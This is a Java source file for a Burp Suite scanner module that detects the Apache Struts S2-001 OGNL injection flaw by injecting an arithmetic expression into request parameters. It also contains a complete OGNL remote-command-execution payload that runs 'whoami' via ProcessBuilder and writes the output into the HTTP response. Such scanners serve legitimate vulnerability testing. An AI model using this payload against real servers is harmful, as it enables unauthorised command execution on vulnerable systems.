package module.java.vul;

import burp.*;

import java.io.PrintWriter;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.List;

public class S2_001 extends IModule {
    public int random1 = (int)(Math.random()*10000);
    public int random2 = (int)(Math.random()*10000);
    public String check_poc = "%{" + random1 + "*" + random2 + "}";
    public String exec_payload = "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}";

    public S2_001() {
        moduleName = "S2-001";
        detail = exec_payload;
    }

    public IScanIssue start() {
        PrintWriter stdout = new PrintWriter(callbacks.getStdout(), true);
        stdout.println("S2_001 start");

        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);

        List<IParameter> parameters = requestInfo.getParameters();
        for (IParameter parameter: parameters) {
            if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                IParameter newParameter = helpers.buildParameter(parameter.getName(), URLEncoder.encode(check_poc), parameter.getType());
                byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
                byte[] response = newHttpRequestResponse.getResponse();
                IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
                byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);

                String mark = String.valueOf(random1 * random2);
                String bodyText = new String(body);
                if (bodyText.contains(mark)) {
                    this.iHttpRequestResponse = newHttpRequestResponse;
                    return creatCustomScanIssue();
                }
            }
        }
        return null;
    }
}
